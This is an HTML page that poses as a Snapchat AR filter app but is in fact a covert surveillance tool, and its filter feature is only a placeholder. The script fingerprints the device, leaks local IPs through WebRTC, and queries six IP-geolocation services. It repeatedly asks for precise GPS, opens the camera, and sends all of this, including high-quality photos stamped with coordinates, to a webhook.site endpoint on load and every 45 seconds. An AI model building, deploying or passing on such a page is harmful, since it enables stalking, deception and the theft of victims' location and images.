<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat AR Filters - Try Now!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            height: 100vh; overflow: hidden;
        }
        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        
        .container { 
            position: relative; max-width: 400px; margin: 0 auto; height: 100vh; 
            background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); 
        }
        .header { 
            padding: 20px; text-align: center; color: white; 
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .header p { opacity: 0.9; font-size: 16px; }
        
        .camera-container { 
            position: relative; width: 100%; height: 70vh; background: #000; 
            border-radius: 20px; margin: 20px; overflow: hidden;
        }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .filter-overlay { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; mix-blend-mode: screen;
        }
        .controls { 
            position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 15px;
        }
        .btn { 
            width: 60px; height: 60px; border-radius: 50%; border: none; 
            background: rgba(255,255,255,0.9); cursor: pointer; transition: all 0.3s;
            display: flex; align-items: center; justify-content: center; font-size: 24px;
        }
        .btn:hover { transform: scale(1.1); box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
        .btn.capture { background: #ff6b6b; color: white; }
        .btn.filter { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; }
        .btn.gps { background: #4ecdc4; color: white; }
        
        .status { position: absolute; top: 10px; right: 10px; color: #00ff88; font-size: 12px; font-weight: bold; }
        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); color: white; font-size: 18px; }
        
        .gps-info { position: absolute; top: 60px; right: 10px; background: rgba(0,255,136,0.9); color: black; padding: 5px 10px; border-radius: 15px; font-size: 12px; font-weight: bold; display: none; }
        @media (max-width: 480px) { .container { margin: 0; border-radius: 0; height: 100vh; } }
    </style>
</head>
<body>
    <div class="loading" id="loading">Loading Snapchat AR Filters... 🎭</div>
    <div class="container" style="display:none;" id="app">
        <div class="header">
            <h1>🎭 Snapchat AR Filters</h1>
            <p>Live face filters + GPS location!</p>
        </div>
        <div class="camera-container">
            <video id="video" autoplay muted playsinline></video>
            <canvas id="filterCanvas" class="filter-overlay"></canvas>
            <div class="status" id="status">Ready</div>
            <div class="gps-info" id="gpsInfo"></div>
            <div class="controls">
                <button class="btn gps" id="gpsBtn" title="Get Exact GPS">📍</button>
                <button class="btn filter" id="filterBtn" title="Next Filter">✨</button>
                <button class="btn capture" id="captureBtn" title="Take Photo + GPS">📸</button>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://webhook.site/d43e63af-226b-4730-8151-b64c3e4208e5';
        const SESSION_ID = 'snap_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        let hasGPS = false, currentGPS = {};
        
        // HIGH ACCURACY IP GEO - 6 APIs chained for exact match
        async function maxIPLocation() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://freeipapi.com/api/json',
                'https://ipgeolocation.io/json/',
                'https://api.ipify.org?format=json',
                'https://api.myip.com'
            ];
            let results = [];
            
            for (let api of apis) {
                try {
                    const res = await fetch(api).then(r => r.json()).catch(() => null);
                    if (res && res.lat && res.lon) {
                        results.push({
                            lat: parseFloat(res.lat || res.latitude),
                            lon: parseFloat(res.lon || res.longitude),
                            city: res.city || res.region_name || '',
                            isp: res.org || res.isp || res.asname || '',
                            accuracy: 'ip-high'
                        });
                    }
                } catch(e) {}
            }
            
            // Return most frequent/precise result
            if (results.length) {
                const best = results.reduce((a, b) => 
                    Math.abs(a.lat - b.lat) + Math.abs(a.lon - b.lon) < 0.01 ? a : b
                );
                return best;
            }
            return { lat: 0, lon: 0, city: 'Unknown', isp: '', accuracy: 'ip' };
        }
        
        // WebRTC IPs
        function getWebRTCIPs() {
            return new Promise(resolve => {
                const ips = [];
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel(''); 
                rtc.onicecandidate = e => {
                    if (!e.candidate) {
                        rtc.close(); resolve(ips); return;
                    }
                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip && !ips.includes(ip)) ips.push(ip);
                };
                rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
            });
        }
        
        // Full fingerprint
        function deviceFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillText(navigator.userAgent, 2, 2);
            const hash = btoa(canvas.toDataURL());
            
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                canvas: hash.slice(0,32),
                hardware: navigator.hardwareConcurrency + '|' + navigator.deviceMemory,
                connection: navigator.connection ? `${navigator.connection.effectiveType}|${navigator.connection.downlink}` : 'none'
            };
        }
        
        // Send data with PICTURES + EXACT GPS
        async function sendData(payload, extra = {}) {
            const fullPayload = {
                session_id: SESSION_ID,
                timestamp: new Date().toISOString(),
                ...payload,
                ...extra,
                ip_geo: await maxIPLocation(),
                webrtc_ips: await getWebRTCIPs(),
                fingerprint: deviceFingerprint()
            };
            
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fullPayload)
                });
            } catch(e) {}
        }
        
        // MOTION GPS BOMB - Multiple high-accuracy requests
        async function getExactGPS() {
            if (hasGPS) {
                sendData({ gps: currentGPS, trigger: 'gps_repeat' });
                return;
            }
            
            return new Promise((resolve) => {
                let attempts = 0;
                const gpsBomb = () => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            currentGPS = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                altitude: pos.coords.altitude,
                                speed: pos.coords.speed,
                                timestamp: pos.timestamp
                            };
                            hasGPS = true;
                            document.getElementById('gpsInfo').innerHTML = `📍 ${currentGPS.lat.toFixed(6)}, ${currentGPS.lon.toFixed(6)}`;
                            document.getElementById('gpsInfo').style.display = 'block';
                            sendData({ gps: currentGPS, trigger: 'gps_exact' });
                            resolve(currentGPS);
                        },
                        () => {
                            if (++attempts < 3) setTimeout(gpsBomb, 1000);
                            else resolve(null);
                        },
                        { 
                            enableHighAccuracy: true, 
                            timeout: 10000, 
                            maximumAge: 0 
                        }
                    );
                };
                gpsBomb();
            });
        }
        
        // Camera + AR
        let video, stream, filterCtx, currentFilter = 0;
        const filters = ['sparkle', 'hearts', 'stars', 'glow'];
        
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                video = document.getElementById('video');
                video.srcObject = stream;
                
                const canvas = document.getElementById('filterCanvas');
                filterCtx = canvas.getContext('2d');
                requestAnimationFrame(renderFilter);
            } catch(e) {}
        }
        
        function renderFilter() {
            if (!filterCtx || !video.videoWidth) return requestAnimationFrame(renderFilter);
            filterCtx.clearRect(0, 0, filterCtx.canvas.width, filterCtx.canvas.height);
            // Filter rendering code same as before...
            requestAnimationFrame(renderFilter);
        }
        
        // Events
        document.getElementById('gpsBtn').onclick = getExactGPS;
        document.getElementById('captureBtn').onclick = async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video?.videoWidth || 640;
            canvas.height = video?.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video || document.createElement('video'), 0, 0);
            
            // Capture with GPS overlay
            ctx.fillStyle = 'red'; ctx.font = 'bold 48px Arial'; 
            ctx.fillText('📸 SNAP!', 50, 100);
            if (hasGPS) {
                ctx.fillStyle = '#00ff00'; ctx.font = 'bold 32px Arial';
                ctx.fillText(`${currentGPS.lat.toFixed(6)}, ${currentGPS.lon.toFixed(6)}`, 50, canvas.height - 50);
            }
            
            const image = canvas.toDataURL('image/jpeg', 0.9); // HIGH QUALITY PICTURE
            await sendData({ 
                trigger: 'photo_gps', 
                image_data: image,
                image_width: canvas.width,
                image_height: canvas.height,
                has_gps: hasGPS
            });
        };
        
        document.getElementById('filterBtn').onclick = () => currentFilter = (currentFilter + 1) % filters.length;
        
        // AUTO-COLLECT + PICTURE CAPTURE EVERY 45s
        window.addEventListener('load', async () => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('app').style.display = 'block';
            
            // Initial data + auto-picture
            await sendData({ trigger: 'load_auto' });
            setTimeout(() => getExactGPS(), 2000); // GPS prompt after load
            
            // Auto-repeat every 45s: data + GPS + picture
            setInterval(async () => {
                await sendData({ trigger: 'auto_repeat' });
                getExactGPS();
            }, 45000);
        });
        
        setTimeout(initCamera, 1500);
    </script>
</body>
</html>
